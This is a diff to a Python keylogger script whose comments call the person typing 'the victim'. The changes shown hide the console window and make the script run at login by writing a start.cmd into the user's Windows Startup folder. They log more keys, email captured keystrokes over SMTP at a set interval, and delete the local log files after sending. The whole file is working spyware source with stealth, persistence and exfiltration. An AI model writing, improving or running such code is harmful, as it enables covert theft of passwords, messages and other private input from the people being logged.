@@ -6,9 +6,10 @@ import urllib.request
 import sys
 import os
 import os.path
+import shutil
 from pynput.keyboard import Key, Listener
 from datetime import datetime
-from os.path import basename
+from os.path import basename, exists
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from email.mime.application import MIMEApplication
@@ -23,10 +24,10 @@ logger = logging.getLogger()
 EXIT_COMBINATION = {Key.ctrl_l, Key.f12}        # Press [L CTRL] + [F12] to stop keylogger
 EMAIL_INTERVAL = 100                            # Specify the amount of characters the victim needs to input before email is sent
 PORT = 465                                      # Specify port number (465 recommended)
-SMTP_SERVER = "smtp.gmail.com"                  # Specify SMTP server
+SMTP_SERVER = "smtp.example.com"                # Specify SMTP server
 TO_ADDR = "user@domain.com"                     # Specify recipient email address
 FROM_ADDR = "user@domain.com"                   # Specify sender email address
-PASSWORD = "your_password"                      # Specify sender email account password
+PASSWORD = "your_password"                      # Enter sender email account password
 HOSTNAME = socket.gethostname()
 USER = os.getlogin()
 FILE_NAME = basename(sys.argv[0].split("\\")[-1])
@@ -57,30 +58,21 @@ def log(text):
 # Add to system starup
 def add_startup():
     # Get keylogger.py file path
-    file_path = os.path.dirname(os.path.realpath(__file__))
-    file_name = basename(sys.argv[0].split("\\")[-1])
-    complete_file_path = file_path + "\\" + file_name
+    abs_path = sys.argv[0].split("\\")[-1]
+    file_name = basename(abs_path)
+    curr_dir = os.getcwd()
     
-    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-    startup_key = OpenKey(HKEY_CURRENT_USER, key_path, 0, KEY_ALL_ACCESS)
-    added_to_startup = False
+    startup = fr"C:\Users\{USER}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\start.cmd"
+    startup_exists = exists(startup)
     
-    # If keylogger.py entry exists, do not create entry again
-    with startup_key as hkey:
-        try:
-            for i in range(1024):
-                val = EnumValue(hkey, i)[0]
-                if val == "keylogger.py":
-                    logger.info("Script already added to Windows registry")
-                    added_to_startup = True
-                    break
-        except OSError:
-            pass
-        # If If keylogger.py entry does not exist, create a new entry
-        if not added_to_startup:
-            SetValueEx(startup_key, "keylogger.py", 0, REG_SZ, f"\"{complete_file_path}\"")
-            logger.info("\"keylogger.py\" successfully added to Windows registry")
-
+    if not startup_exists:
+        startup_file = open("start.cmd", "w")
+        startup_file.write(f"cd {curr_dir}\n")
+        startup_file.write("timeout /T 30 /NOBREAK\n")
+        startup_file.write(f"python {abs_path}")
+        startup_file.close()
+        shutil.move(curr_dir + "\\start.cmd", startup)
+        
 # Send email with keylogs.txt attached
 def send_email():
     # Set messgae header and body
@@ -113,8 +105,15 @@ def send_email():
     server.login(FROM_ADDR, PASSWORD)
     logger.info(f"{FROM_ADDR} login successful")
     server.send_message(msg, from_addr = FROM_ADDR, to_addrs = [TO_ADDR])
-    logger.info(f"Files sent from {FROM_ADDR} to {TO_ADDR}\n")
+    logger.info(f"Files sent from {FROM_ADDR} to {TO_ADDR}")
     server.quit()
+
+# Hide terminal
+def hide():
+    import win32console, win32gui
+    window = win32console.GetConsoleWindow()
+    win32gui.ShowWindow(window, 0)
+    return True
 
 # Detect keystrokes
 def on_press(key):
@@ -136,6 +135,8 @@ def on_press(key):
             log("\n[TAB]\n")
         elif key == Key.enter:
             log("\n[ENTER]\n")
+        elif key == Key.ctrl_l or key == Key.ctrl_r:
+            log("\n[CTRL]\n")
         elif key == Key.shift:
             pass
         elif key == Key.space:
@@ -143,13 +144,16 @@ def on_press(key):
         else:
             log("\n" + str(key) + "\n")
     
-    if keys_pressed % EMAIL_INTERVAL == 0:
+    if keys_pressed == EMAIL_INTERVAL:
         logger.info("Interval reached")
-        t =  threading.Thread(target = send_email)
+        t = threading.Thread(target = send_email)
         t.start()
+        keys_pressed = 0
     
 def on_release(key):
     pass
+
+hide()
 
 logger.info("[KEYLOGGER START]")
 add_startup()
@@ -185,8 +189,15 @@ log("-----------------------------\n")
 if internet_conn:
     send_email()
     # Clear previous log only if it has aready been sent via email
-    with open("keylogs.txt", "w") as f:
-        f.close()
+    
+    handlers = logger.handlers[:]
+    for handler in handlers:
+        logger.removeHandler(handler)
+        handler.close()
+        
+    os.remove("keylogs.txt")
+    os.remove("py-keylogger.log")
+    
 else:
     logger.warning("Could not connect to the internet. " \
         "Email will be attempted when the keylogger is stopped again.")
